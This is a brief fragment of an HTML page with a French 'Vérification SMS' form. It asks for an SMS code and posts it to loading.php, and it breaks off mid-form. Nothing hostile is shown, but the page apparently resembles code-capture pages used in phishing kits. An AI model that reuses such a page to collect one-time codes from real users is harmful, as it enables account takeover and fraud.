...
<head>
    ...
    <style>body{margin:0;padding:20px;font-family:Segoe UI;background:#f0f2f5}.container{max-width:400px;margin:auto;background:white;padding:20px;border-radius:8px}input{width:100%;padding:10px;border:1px solid #ddd;border-radius:6px}button{background:#9c27b0;color:white;padding:10px 0;border:none;border-radius:6px;width:100%;cursor:pointer}</style>
</head>
<body>
    <div class="container">
        <h2>Vérification SMS</h2>
        <form action="loading.php" method="post">
            <input name="sms_code" placeholder="Code SMS" required>
